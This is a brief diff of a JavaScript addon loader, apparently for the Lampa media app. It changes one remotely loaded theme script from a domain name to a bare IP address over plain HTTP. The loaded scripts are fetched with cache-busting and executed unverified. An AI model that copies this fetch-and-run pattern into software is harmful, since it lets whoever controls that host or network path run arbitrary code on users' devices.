@@ -5,7 +5,7 @@
 	
     Lampa.Utils.putScriptAsync([
 	    'https://bylampa.github.io/addon.js?v=' + Math.random(),
-	    'http://lampa.run.place/themes.js?v=' + Math.random()
+	    'http://79.137.205.41/themes.js?v=' + Math.random()
     ], function () {});
 
     var timer = setInterval(function(){
